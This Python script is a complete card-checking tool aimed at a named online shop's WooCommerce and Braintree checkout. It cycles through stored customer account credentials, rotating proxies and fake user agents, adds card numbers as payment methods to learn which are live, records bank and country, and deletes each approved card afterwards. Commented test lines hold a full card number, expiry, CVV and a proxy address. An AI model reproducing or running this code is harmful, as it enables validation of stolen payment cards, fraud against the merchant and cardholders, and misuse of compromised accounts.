import requests,secrets,json,time,base64
from bs4 import BeautifulSoup 
from datetime import datetime
from user_agent import generate_user_agent
import re,pycountry,os
from kvsqlite.sync import Client

def version():
    version = 3
    return(version)

def prox(proxy,req):
    global proxyy
    if proxy == "none":
        try:
            proxies_file = open('C:/Users/aa846/Desktop/New folder (3)/Test/files/LIVE proxy.txt','r+')
            read_proxies = proxies_file.read().splitlines()
            pr = secrets.choice(read_proxies)
            proxies_file.close()
        except:
            proxies_file = open('C:/Users/aa846/Desktop/New folder (3)/Test/files/all live proxy.txt','r+')
            read_proxies = proxies_file.read().splitlines()
            pr = secrets.choice(read_proxies)
            proxies_file.close()
        proxyy = pr
        req.proxies = {"https":f"http://{proxyy}","http":f"http://{proxyy}"}
    
    else:
        proxyy = proxy
        req.proxies = {"https":f"http://{proxyy}","http":f"http://{proxyy}"}


def log(req,user_agent):
    global email,password
    acc =  open("accounts.txt","r")
    rd = acc.readlines()
    acc.close()
    db = Client("data.db")
    done = False
    while done != True:
        rnd = secrets.choice(rd)
        rnd_index = rd.index(rnd)
        email_pass = rnd.split("\n")[0]
        email = str(email_pass.split(":")[0])
        password = str(email_pass.split(":")[1])
        db.cleanex()
        getif = db.exists(email)
        if getif == True:
            done = False
            pass
        else:
            done = True
    db.setex(key=email,value=True,ttl=30)
    db.close()

    try:
        coock = email_pass.split("{")[1]
        coock = ("{"+coock).replace("\'","\"")
    except:
        coock = None

    if coock != None:
        req.cookies.update(json.loads(coock))
    else:
        headers = {'user-agent': user_agent}
        response = req.get(url='https://californiabalsamic.com/my-account/',headers=headers,timeout=15)
        woocommerce_login = re.search('''name="woocommerce-login-nonce" value="(.*?)" ''',response.text).group(1)

        data = {
    'username': str(email),
    'password': str(password),
    'wpa_initiator': '',
    'alt_s': '',
    'woocommerce-login-nonce': woocommerce_login,
    '_wp_http_referer': '/my-account/',
    'login': 'Log in'}
        response = req.post('https://californiabalsamic.com/my-account/', data=data, headers=headers,timeout=None)
        login = re.search('''Hello''',response.text)
        if login != None:
            coockies = req.cookies.get_dict()
            rd[rnd_index] = email_pass+":"+str(coockies)+"\n"
            with open("accounts.txt","w") as file:
                file.writelines(rd)
                file.close()
            return(True)
        else:
            return(False)

def payment(cc,mm,yy,cvv,use_proxy,proxy,req,user_agent):
    card = cc+"|"+mm+"|"+yy+"|"+cvv
    if use_proxy == True:
        global proxyy
        prox(proxy,req)
    else:
        proxyy = ""
    
    try:
        headers = {'referer': 'https://californiabalsamic.com/my-account/payment-methods/','user-agent': user_agent}
        response = req.get('https://californiabalsamic.com/my-account/add-payment-method/', cookies=req.cookies, headers=headers,timeout=None)
        add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
        enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
        dec = json.loads(base64.b64decode(enc).decode('utf-8'))
        au=dec["authorizationFingerprint"]

        headers = {
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
       'origin': 'https://assets.braintreegateway.com',
       'referer': 'https://assets.braintreegateway.com/',
       'user-agent': user_agent}
        json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '8188bf67-d93b-4956-8777-b47a691c5bd1',} ,
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvv,
                    'billingAddress': {
                        'postalCode': '10001',
                        'streetAddress': ''} ,
                                },
                'options': {
                    'validate': False,
                            },
                    },
                },
    'operationName': 'TokenizeCreditCard'}
        response = req.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data,timeout=None).json()
        tok = response["data"]["tokenizeCreditCard"]["token"]
        ########country
        try:
            alpha_3 = response["data"]["tokenizeCreditCard"]["creditCard"]["binData"]["countryOfIssuance"]
            coun = str(pycountry.countries.get(alpha_3=alpha_3))
            alpha_2 = re.findall('''alpha_2=\'(.*?)\'''',coun)[0]
            def country_code_to_emoji(alpha_2):
                return ''.join(chr(0x1F1E6 + ord(c) - ord('A')) for c in alpha_2.upper())
            country = re.findall('''name=\'(.*?)\'''',coun)[0] +" "+country_code_to_emoji(alpha_2)
            bank = response["data"]["tokenizeCreditCard"]["creditCard"]["binData"]["issuingBank"]
            prepaid = response["data"]["tokenizeCreditCard"]["creditCard"]["binData"]["prepaid"]
        except:
            country,bank,prepaid = None,None,None

        headers = {
    'origin': 'https://californiabalsamic.com',
    'referer': 'https://californiabalsamic.com/my-account/add-payment-method/',
    'user-agent': user_agent}
        data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"af68d74b8544b687a97f6e2543d6c949","fraud_merchant_id":null,"correlation_id":"0769597578845b71ada15053b306f40a"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': str(dec).replace("\'","\""),
    'billing_address_1': '',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1'}
        response = req.post('https://californiabalsamic.com/my-account/add-payment-method/', cookies=req.cookies, headers=headers, data=data,timeout=None)
        text = response.text
        bs = BeautifulSoup(text,'html.parser')
        try:
            woo_error = bs.find_all('ul',attrs={"class":"woocommerce-error"})
            result = str(woo_error).split("Reason: ")[1].split("\t")[0]
        except:
            if '''risk_threshold''' in text:
                result = '''RISK: Retry this BIN later.'''
            elif '''Nice! New payment method added''' in text or '''Payment method successfully added.''' in text:
                result = '''Approved'''
            elif "You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds." in text:
                result = "SPAM"
            else:
                result = '''Error'''
        #print(result)
        #url_logout = str(bs.find_all("li",attrs={"class":"woocommerce-MyAccount-navigation-link woocommerce-MyAccount-navigation-link--customer-logout"})).split("href=")[1].split("\"")[1]
        if "Approved" in result:
            url_delet = str(bs.find_all("a",attrs={"class":"button delete"})).split("href=")[1].split("\"")[1]
            return{"card": card, "response": result,"country":country,"bank":bank,"url_delet":str(url_delet),"proxy":proxyy}
        else:
            return{"card": card, "response": result,"country":country,"bank":bank,"url_delet":None,"proxy":proxyy}
    except Exception as error:
        print(error)
        return("error_proxy")


def delet(url_delet,req,email,password,user_agent):
    wpnonce = url_delet.split("=")[1]
    headers = {'referer': 'https://californiabalsamic.com/my-account/','user-agent': user_agent}
    params = {
    '_wpnonce': wpnonce}
    response = req.get(
    str(url_delet),
    params=params,
    cookies=req.cookies,
    headers=headers,timeout=None)
    if "Payment method deleted." in (response.text):
        pass
    else:
        print(f"ERROR DELET CARD.\nacc: {email}:{password}\n")

def start(cc,mm,yy,cvv,use_proxy,proxy):
    try:
        user_agent = generate_user_agent()
        t1 = datetime.now().replace(microsecond=0)
        req = requests.Session()
        #print(req.cookies)
        #add payment
        login = log(req,user_agent)
        if login == False:
            return{"error":f"error account ({email}:{password})"}
        chk = payment(cc,mm,yy,cvv,use_proxy,proxy,req,user_agent)
        if chk == "error_proxy":
            return{"error":f"your proxy is dd ({proxyy})"}
        else:
            url_delet = chk["url_delet"]
            if url_delet != None:
                delet(url_delet,req,email,password,user_agent)
            t2 = datetime.now().replace(microsecond=0)
            timee = ((t2-t1).seconds)
            chk["time"] = timee
            return(chk)
    except Exception as error:
        print(error)
        time.sleep(5)
        print({"error":"start"})
        pass

#cc = "4364340004104412"
#mm = "12"
#yy = "27"
#cvv = "273"
#use_proxy = False
#proxy = "15.204.161.192:18080"
#print(start("4364340004104412","12","27","273",use_proxy=False,proxy=None))


        
